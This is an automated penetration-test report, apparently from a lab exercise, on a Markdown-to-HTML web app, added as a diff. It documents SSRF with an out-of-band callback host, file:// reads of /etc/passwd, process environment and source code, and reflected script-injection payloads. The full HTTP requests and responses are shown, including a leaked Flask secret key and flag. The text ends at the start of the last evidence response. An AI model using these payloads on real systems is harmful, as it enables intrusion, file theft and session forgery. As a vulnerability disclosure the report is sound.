@@ -1,0 +1,730 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqxue7u4-kp9nt5</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [ssrf] SSRF via URL fetch in /convert endpoint</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#b00020">CRITICAL</span> [path-traversal] Local file read via file:// scheme in /convert url param (path traversal)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [xss-reflected] Reflected XSS in markdown_text param at /convert</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#d32f2f">HIGH</span> [info-disclosure] Hardcoded application secrets (Flask secret_key + FLAG) disclosed via source-file read on /convert</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqxue7u4-kp9nt5</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32815/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T13:46:26.761Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>3 mapped · 3 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32815</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">2</b> critical</span><span><b style="color:#d32f2f">2</b> high</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [ssrf] SSRF via URL fetch in /convert endpoint</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32815/</div>
+<div class="desc">The POST /convert endpoint accepts a `url` parameter and fetches its content server-side without any restriction on scheme, host, or network range. An attacker can supply an arbitrary URL and the server will make the request, returning the response in the page. Confirmed via Burp Collaborator OOB: the server sent DNS lookups and an HTTP request to our callback host, proving full server-side request forgery. This allows probing internal services (169.254.169.254 cloud metadata, internal APIs), exfiltrating data, and pivoting to the internal network.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:32815/convert with body: url=http://&amp;lt;attacker-collaborator-host&amp;gt;/&amp;markdown_text=\n2. Observe DNS and HTTP callbacks from the target server IP (27.80.249.86 / 27.83.152.211) to the Collaborator host.\n3. Also works against internal targets: url=http://169.254.169.254/latest/meta-data/</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuh882-2</code> — <code>artifacts/s-0001/ev-mqxuh882-2/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2Fverdict-oob-noref-7ksjxxbk.invalid%2Fssrf-test&amp;markdown_text=</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 189
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:48:46 GMT
+location: /
+server: Werkzeug/3.0.6 Python/3.8.20
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+[VERDICT-OOB] control: benign host, no callback expected</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuhd88-4</code> — <code>artifacts/s-0001/ev-mqxuhd88-4/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2F7ksjxxbkr7i086b7jcbt7zxjoau7iw.oastify.com%2Fssrf-test&amp;markdown_text=</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 912
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:48:53 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=7ksjxxbkr7i086b7jcbt7zxjoau7iw.oastify.com payload_id=7ksjxxbkr7i086b7jcbt7zxjoau7iw interactions=[DNS@2026-06-28T13:48:47.317Z from 106.187.11.41; DNS@2026-06-28T13:48:47.322Z from 27.80.249.86; HTTP@2026-06-28T13:48:47.981Z from 27.83.152.211] [read#1]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuhdyi-5</code> — <code>artifacts/s-0001/ev-mqxuhdyi-5/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2F7ksjxxbkr7i086b7jcbt7zxjoau7iw.oastify.com%2Fssrf-test&amp;markdown_text=</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 912
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:48:54 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=7ksjxxbkr7i086b7jcbt7zxjoau7iw.oastify.com payload_id=7ksjxxbkr7i086b7jcbt7zxjoau7iw interactions=[DNS@2026-06-28T13:48:47.317Z from 106.187.11.41; DNS@2026-06-28T13:48:47.322Z from 27.80.249.86; HTTP@2026-06-28T13:48:47.981Z from 27.83.152.211] [read#2]</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 2. [path-traversal] Local file read via file:// scheme in /convert url param (path traversal)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32815/</div>
+<div class="desc">The `url` parameter in POST /convert accepts the `file://` scheme. The server reads the specified local file path and returns its contents in the HTTP response body (rendered as markdown in a result div). Confirmed reading `/etc/passwd` (full user list: root, daemon, www-data, nobody, etc). The server runs as root (HOME=/root seen in /proc/self/environ). An attacker can read any file readable by the process — application source, configuration secrets, private keys, and OS files. Submitting a non-existent path triggers a 302 redirect with no content (control fails), confirming the distinction.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:32815/convert body: url=file:///etc/passwd&amp;markdown_text=\n2. Response 200 — result div contains full /etc/passwd content (root:x:0:0:root:/root:/bin/bash ...)\n3. Negative control: url=file:///nonexistent/path/does/not/exist → 302 redirect to / (no file content).\n4. Both replays stable at bodyLength=1697.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuhwd7-a</code> — <code>artifacts/s-0001/ev-mqxuhwd7-a/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=file%3A%2F%2F%2Fnonexistent%2Fpath%2Fthat%2Fdoes%2Fnot%2Fexist&amp;markdown_text=</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 189
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:49:18 GMT
+location: /
+server: Werkzeug/3.0.6 Python/3.8.20
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/&quot;&gt;/&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxujy4t-f</code> — <code>artifacts/s-0001/ev-mqxujy4t-f/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=file%3A%2F%2F%2Fetc%2Fpasswd&amp;markdown_text=</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1697
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:50:53 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;p&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/p&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxujyxb-g</code> — <code>artifacts/s-0001/ev-mqxujyxb-g/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=file%3A%2F%2F%2Fetc%2Fpasswd&amp;markdown_text=</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1697
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:50:54 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;p&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/p&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [xss-reflected] Reflected XSS in markdown_text param at /convert</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32815/</div>
+<div class="desc">The `markdown_text` parameter in POST /convert is processed by a Markdown-to-HTML converter that passes raw HTML tags through without sanitization. Submitting `&lt;script&gt;alert(1)&lt;/script&gt;` or `&lt;script&gt;alert(document.domain)&lt;/script&gt;` results in those tags being embedded unescaped inside a `&lt;div class=&quot;result&quot;&gt;` in the HTML response. A victim who visits a crafted link or submits a form pointing to /convert will have arbitrary JavaScript execute in their browser origin.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:32815/convert with body: url=&amp;markdown_text=&lt;script&gt;alert(1)&lt;/script&gt;\n2. Response body contains `&lt;script&gt;alert(1)&lt;/script&gt;` unescaped inside &lt;div class=&quot;result&quot;&gt;.\n3. Benign control (markdown_text=hello world) returns only &lt;p&gt;hello world&lt;/p&gt; — no script tags.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuiy34-d</code> — <code>artifacts/s-0001/ev-mqxuiy34-d/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=&amp;markdown_text=hello+world</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 870
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:50:07 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;p&gt;hello world&lt;/p&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuhysz-c</code> — <code>artifacts/s-0001/ev-mqxuhysz-c/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=&amp;markdown_text=%3Cscript%3Ealert(1)%3C%2Fscript%3E%0A%0A**bold**</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 907
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:49:21 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;p&gt;&lt;strong&gt;bold&lt;/strong&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuiz88-e</code> — <code>artifacts/s-0001/ev-mqxuiz88-e/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=&amp;markdown_text=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 891
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:50:08 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;script&gt;alert(document.domain)&lt;/script&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 4. [info-disclosure] Hardcoded application secrets (Flask secret_key + FLAG) disclosed via source-file read on /convert</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32815/</div>
+<div class="desc">The /convert endpoint fetches an arbitrary attacker-supplied `url` server-side via Python `urllib.request.urlopen` and renders the result. Supplying `url=file:///proc/self/cwd/app.py` causes the server to read and return its own source code, which contains hardcoded secrets in cleartext:
+
+  - `app.secret_key = 'supersecretkey'`  — the Flask session-signing key. Knowing it lets an attacker forge/tamper arbitrary signed `session` cookies (session-data forgery → potential authentication/authorization bypass).
+  - `FLAG = &quot;flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}&quot;` — a hardcoded secret embedded directly in source.
+
+These are REAL, live, in-scope secrets (not placeholders/example keys). The same primitive also dumped `/proc/self/environ` and `/proc/self/cmdline` (`python app.py`), confirming full server-side read access to local files. This is distinct from the raw path-traversal/SSRF primitive already recorded — the impact recorded here is the disclosure of live application secrets that enable session forgery.</div>
+<div><b>Reproduction</b></div><pre>1. POST to /convert (Content-Type: application/x-www-form-urlencoded) with body `url=file:///proc/self/cwd/app.py`.
+2. The 200 response embeds the rendered app source containing `app.secret_key = 'supersecretkey'` and `FLAG = &quot;flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}&quot;`.
+3. Negative control: POST `url=file:///proc/self/environ` returns 200 but contains no app secret (1057 bytes), distinguishing the leak from a catch-all 200.
+4. Both replays (ev-mqxup5wc-p, ev-mqxuqhrk-q) stably return the secret (2628 bytes).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuowfl-n</code> — <code>artifacts/_/ev-mqxuowfl-n/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=file:///proc/self/environ</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1057
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:54:44 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;p&gt;PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=bf481ad20679 LANG=C.UTF-8 GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568 PYTHON_VERSION=3.8.20 HOME=/root &lt;/p&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxup5wc-p</code> — <code>artifacts/_/ev-mqxup5wc-p/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=file:///proc/self/cwd/app.py</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 2628
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:54:57 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
